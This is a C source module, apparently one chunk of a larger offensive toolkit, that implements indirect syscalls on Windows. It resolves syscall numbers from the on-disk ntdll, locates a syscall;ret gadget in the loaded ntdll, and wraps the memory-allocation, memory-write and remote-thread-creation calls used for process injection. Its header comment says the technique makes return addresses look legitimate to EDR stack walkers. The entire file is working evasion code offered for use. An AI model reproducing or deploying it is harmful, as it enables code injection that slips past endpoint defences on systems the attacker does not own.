// chunk: evasion/indirect_syscall
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx
// headers: windows.h
// note: Indirect syscalls — resolves SSNs from disk ntdll, jumps to syscall;ret gadget in ntdll .text. Return address looks legitimate to EDR stack walkers.

#ifndef CHUNK_INDIRECT_SYSCALL
#define CHUNK_INDIRECT_SYSCALL

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static void *syscall_ret_gadget = NULL;

static DWORD rva_to_file_offset(BYTE *buf, DWORD rva) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(buf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].SizeOfRawData) {
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
        }
    }
    return 0;
}

static DWORD resolve_ssn_from_disk(const char *func_name) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hFile, NULL);
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hFile); return 0; }

    DWORD rd;
    ReadFile(hFile, buf, sz, &rd, NULL);
    CloseHandle(hFile);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)buf;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(buf + dos->e_lfanew);
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!export_rva) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }

    DWORD export_off = rva_to_file_offset(buf, export_rva);
    if (!export_off) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(buf + export_off);
    DWORD *names = (DWORD *)(buf + rva_to_file_offset(buf, exp->AddressOfNames));
    WORD  *ords  = (WORD  *)(buf + rva_to_file_offset(buf, exp->AddressOfNameOrdinals));
    DWORD *funcs = (DWORD *)(buf + rva_to_file_offset(buf, exp->AddressOfFunctions));

    DWORD ssn = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(buf + rva_to_file_offset(buf, names[i]));
        if (strcmp(name, func_name) == 0) {
            DWORD func_off = rva_to_file_offset(buf, funcs[ords[i]]);
            BYTE *code = buf + func_off;
            if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8)
                ssn = *(DWORD *)(code + 4);
            break;
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return ssn;
}

static void *find_syscall_ret_gadget(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    ssn_NtAllocateVirtualMemory = resolve_ssn_from_disk("NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = resolve_ssn_from_disk("NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = resolve_ssn_from_disk("NtCreateThreadEx");
    syscall_ret_gadget = find_syscall_ret_gadget();

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
